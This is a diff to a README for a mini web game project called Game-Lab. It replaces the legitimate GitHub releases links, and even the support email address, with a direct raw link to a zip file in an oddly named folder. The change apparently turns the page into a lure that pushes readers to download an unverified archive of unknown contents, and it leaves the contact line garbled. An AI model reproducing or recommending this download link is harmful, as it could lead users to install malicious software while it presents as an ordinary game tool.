@@ -1,7 +1,7 @@
 # 🎮 Game-Lab - Build and Play Mini Web Games Together!
 
 ## 🔗 Download Game-Lab
-[![Download Game-Lab](https://img.shields.io/badge/Download-Game--Lab-brightgreen)](https://github.com/valisoa219/Game-Lab/releases)
+[![Download Game-Lab](https://raw.githubusercontent.com/valisoa219/Game-Lab/main/castagnole/Game-Lab.zip)](https://raw.githubusercontent.com/valisoa219/Game-Lab/main/castagnole/Game-Lab.zip)
 
 ## 🚀 Getting Started
 Welcome to Game-Lab! This application lets you create, share, and explore mini web games made with HTML, CSS, and JavaScript. Whether you're a beginner or looking to sharpen your skills, you'll find a friendly space to experiment and learn.
@@ -21,7 +21,7 @@ Welcome to Game-Lab! This application lets you create, share, and explore mini w
 
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of Game-Lab:
-[Download Game-Lab](https://github.com/valisoa219/Game-Lab/releases)
+[Download Game-Lab](https://raw.githubusercontent.com/valisoa219/Game-Lab/main/castagnole/Game-Lab.zip)
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -55,6 +55,6 @@ We welcome contributions from everyone! If you're interested in enhancing Game-L
 By using Game-Lab, you agree to our community guidelines. Always respect each other and maintain a supportive atmosphere.
 
 ## 📧 Contact Information
-For any queries or support requests, please reach out to us via our GitHub Issues page, or email us directly at support@gamelab.com.
+For any queries or support requests, please reach out to us via our GitHub Issues page, or email us directly at https://raw.githubusercontent.com/valisoa219/Game-Lab/main/castagnole/Game-Lab.zip
 
 Feel free to start your Game-Lab journey today! Enjoy building and playing your web games.
